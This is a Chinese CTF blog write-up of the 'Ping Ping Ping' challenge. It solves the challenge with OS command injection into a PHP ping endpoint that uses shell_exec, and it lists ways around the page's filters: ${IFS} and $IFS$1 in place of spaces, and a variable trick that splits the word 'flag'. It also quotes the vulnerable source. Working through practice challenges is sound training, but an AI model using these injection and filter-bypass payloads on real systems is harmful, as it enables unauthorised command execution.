---
title: Ping Ping Ping
subtitle: 一个ctf题目
date: 2023-10-17T18:22:57+08:00
slug: a3176b7
tags:
  - CMD
  - tricks
categories:
  - CTF
---

## 1

  

### （1）

打开靶场，扑面而来一个

`/?ip=`

（如果有点觉悟就会想起来之前做的文件上传从而意识到这是个URL地址符提示。不过当时没有，甚至在想这是什么代码……php？html？）

于是熟练的打开edge查询wp。

于是

```URL

http://2993ad62-21c8-4f1d-b4d6-05bdd7130b70.node4.buuoj.cn:81/?ip=127.0.0.1;ls

```

喜提

(补充：尝试了一下`&& ls`，什么有用的也没有得到)

```txt

PING 127.0.0.1 (127.0.0.1): 56 data bytes

flag.php

index.php

```

这告诉我们有两个php文件，名字如上。

  

### （2）

  

再用`cat`命令

  

```url

/?ip=xxx;cat flag.php

```

  

喜提`fuck your space`。

好嘛，用能想到的space替换符，%20之类的，毫不意外不行。

wp提供了更多的绕过space：

```txt

${IFS}

$IFS$1

${IFS

<> or < 重定向符替换

%09

```

原博一个个试后告诉大家，`$IFS$1`行得通。

  

```URL

https://xxx/?ip=127.0.0.1;cat$IFS$1flag.php

```

  

又告诉你不行——因为flag被过滤了。

  

### （3）

试一下index.php，

```php

PING 127.0.0.1 (127.0.0.1): 56 data bytes

/?ip=

|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){

    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);

    die("fxck your symbol!");

  } else if(preg_match("/ /", $ip)){

    die("fxck your space!");

  } else if(preg_match("/bash/", $ip)){

    die("fxck your bash!");

  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){

    die("fxck your flag!");

  }

  $a = shell_exec("ping -c 4 ".$ip);

  echo "

";

  print_r($a);

}

?>

```

  

解释一下就是：

  

- 1. `PING 127.0.0.1 (127.0.0.1): 56 data bytes`：这是一个命令行输出，表示将对IP地址 127.0.0.1 进行Ping测试。`/?ip=`：这是一个URL参数，用于接收要测试的目标IP地址。

  

- 2. `|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match))`：这是一个正则表达式，用于检查输入的IP地址是否包含特定的符号（ `'`, `"`, `\`, `(`, `)`, `[`, `]`, `{`, `}`）。然后 `echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);`：这一行判断输入的IP地址是否包含特殊字符，并输出匹配结果。最后`die("fxck your symbol!");`：如果前面的正则表达式匹配到特殊字符，将输出错误信息并终止程序运行。

  

- 3. `preg_match("/ /", $ip)`：这是一个正则表达式，用于检查输入的IP地址是否包含空格。然后`die("fxck your space!");`：如果输入的IP地址包含空格，将输出错误信息并终止程序运行。后面都一样就不重复了。

  

- 4.  `$a = shell_exec("ping -c 4 ".$ip);`：执行Ping命令，通过shell_exec函数在操作系统中运行命令，并将结果存储在变量$a中。

  

- 5.`print_r($a);`：打印Ping命令的结果，显示Ping测试的输出信息。

  

### （4）

  

看完这么多过滤，基本可以确定没什么常规的可以写了。

于是一个有趣的就来了：

**改变变量值**

  

有一个变量`$a`，原本的值是第4条说的，我们进行人为修改（它也没禁止）：

```url

https://xxx/?ip=xxxx;a=g;cat$IFS$1fla$a.php

```

解释一下就是：

```python

a=g

flag=fla$a

```

不懂的永别了.jpg

然后就变成了初始界面。很懵逼是吧。

查看页面源代码获得惊喜。至于为什么会这样待我研究一下再来写。
